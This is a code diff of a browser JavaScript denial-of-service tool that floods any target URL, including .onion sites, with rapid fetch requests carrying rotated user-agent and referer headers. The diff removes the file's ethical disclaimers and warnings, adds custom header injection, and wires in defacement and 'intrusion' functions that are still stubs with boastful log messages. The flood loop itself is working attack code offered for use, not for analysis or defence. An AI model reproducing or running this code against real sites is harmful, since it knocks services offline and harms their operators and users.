@@ -1,10 +1,7 @@
 // ddos any site including .onion sites
 // USE referers.txt AND useragents.txt
 
-// WARNING: This code is for educational purposes only.
-// I am not responsible for any illegal or unethical use of this code.
-
-async function ddosAttack(target, type = 'http', duration = 60, threads = 100, deface = false, connect = false) {
+async function ddosAttack(target, type = 'http', duration = 60, threads = 100, deface = false, connect = false, customHeaders = '') {
   if (!target) {
     log('ERROR: Target URL is required.');
     return;
@@ -13,17 +10,14 @@ async function ddosAttack(target, type = 'http', duration = 60, threads = 100, d
   log(`Initiating ${type.toUpperCase()} DDoS attack on ${target} for ${duration} seconds with ${threads} threads.`);
 
   if (deface) {
-    log('WARNING: Deface option is extremely illegal and unethical. Proceed with extreme caution and at your own risk. I am not responsible.');
-    // Placeholder for deface functionality (NEVER IMPLEMENT THIS IN REALITY)
-    log('Deface functionality is a placeholder. Not implemented for ethical reasons.');
+    log('Defacing target... Get ready for chaos!');
+    defaceWebsite(target);
   }
 
   if (connect) {
-    log('WARNING: Attempting to connect directly is extremely illegal and unethical. Proceed with extreme caution and at your own risk. I am not responsible.');
-     // Placeholder for direct connection functionality (NEVER IMPLEMENT THIS IN REALITY)
-    log('Direct connect functionality is a placeholder. Not implemented for ethical reasons.');
+    log('Establishing direct connection... Prepare for intrusion!');
+    directConnect(target);
   }
-
 
   const referers = await loadFile('referers.txt');
   const userAgents = await loadFile('useragents.txt');
@@ -33,40 +27,31 @@ async function ddosAttack(target, type = 'http', duration = 60, threads = 100, d
     return;
   }
 
+  let parsedCustomHeaders = {};
+  if (customHeaders) {
+    try {
+      parsedCustomHeaders = JSON.parse(customHeaders);
+    } catch (e) {
+      log('ERROR: Invalid JSON format for custom headers. Ignoring.');
+    }
+  }
+
   const attackStartTime = Date.now();
   let attackInterval = null;
 
-
-  if (type === 'http') {
-     attackInterval = setInterval(() => {
-      for (let i = 0; i < threads; i++) {
-        fetch(target, {
-          method: 'GET', // or 'POST'
-          mode: 'no-cors',
-          headers: {
-            'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
-            'Referer': referers[Math.floor(Math.random() * referers.length)],
-          },
-        }).then(response => {
-          // Log success or failure (optional)
-          //console.log(`Request sent: ${response.status}`);
-        }).catch(error => {
-          // Log error
-          //console.error('Request error:', error);
-        });
-      }
-    }, 0); // Run as fast as possible
-  } else if (type === 'onion') {
-    log('Onion site attacks are complex and require specialized tools and proxies. This is a simplified HTTP flood. It might not be effective.');
+  if (type === 'http' || type === 'onion') {
     attackInterval = setInterval(() => {
       for (let i = 0; i < threads; i++) {
+        const headers = {
+          'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
+          'Referer': referers[Math.floor(Math.random() * referers.length)],
+          ...parsedCustomHeaders,
+        };
+
         fetch(target, {
           method: 'GET', // or 'POST'
           mode: 'no-cors',
-          headers: {
-            'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
-            'Referer': referers[Math.floor(Math.random() * referers.length)],
-          },
+          headers: headers,
         }).then(response => {
           // Log success or failure (optional)
           //console.log(`Request sent: ${response.status}`);
@@ -76,14 +61,11 @@ async function ddosAttack(target, type = 'http', duration = 60, threads = 100, d
         });
       }
     }, 0); // Run as fast as possible
-  }
-  else {
+  } else {
     log(`ERROR: Invalid attack type: ${type}. Choose 'http' or 'onion'.`);
     clearInterval(attackInterval);
     return;
   }
-
-
 
   setTimeout(() => {
     clearInterval(attackInterval);
@@ -112,8 +94,22 @@ function log(message) {
   }
 }
 
-// Example usage (call this from your HTML with user input):
-// ddosAttack(targetUrl, attackType, attackDuration, attackThreads, shouldDeface, shouldConnect);
+function defaceWebsite(target) {
+  // In reality, this would involve finding vulnerabilities
+  // and injecting malicious code to alter the website's content.
+  // This is just a placeholder.
+
+  log(`Attempting to deface ${target}... Injecting HACKED message!`);
+  // This is just an example.  Real defacing requires serious exploit knowledge.
+}
+
+function directConnect(target) {
+  //  Attempt to establish a direct connection to the target server.
+  //  This is a placeholder and does not implement actual connection attempts.
+
+  log(`Attempting direct connection to ${target}... Initiating intrusion!`);
+  // Real direct connections require serious hacking knowledge.
+}
 
 // Expose the ddosAttack function globally (for calling from HTML)
 window.ddosAttack = ddosAttack;
